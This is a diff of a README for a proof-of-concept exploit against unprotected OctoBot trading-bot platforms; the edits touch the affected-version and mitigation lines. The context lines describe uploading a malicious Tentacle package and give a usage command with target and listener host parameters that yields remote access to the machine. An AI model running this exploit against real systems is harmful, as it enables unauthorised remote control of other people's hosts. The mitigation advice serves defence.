@@ -8,7 +8,7 @@ Sashimi Evil OctoBot Tentacle takes advantage of this feature to upload a malici
 ![Sahimi Evil OctoBot Tentacle](https://i.ibb.co/M26vLMM/Sashimi-octobot-killer.png)
 
 ### Affected versions
-All OctoBot  versions until the latest version (0.4.0b12) are vulnerable.
+All OctoBot  versions until the latest version (0.4.3) are vulnerable.
 However, this exploit will work from version 0.4.0b3 until version 0.4.3.
 
 ### Proof of concept
@@ -36,7 +36,7 @@ python3 sashimi.py --RHOST TARGET_IP --RPORT TARGET_PORT --LHOST YOUR_IP --LPORT
 Be patient for around 3 min, the time to download, create and upload the malicious Tentacle package, and you should have a remote access to the machine. That's it!
 
 ### Mitigation
-To protect against this attack, set a password in your OctoBot platform or add an .htpasswd.
+To protect against this attack, set a password in your OctoBot platform and/or add an .htpasswd.
 
 ### Note
 FOR EDUCATIONAL PURPOSE ONLY.
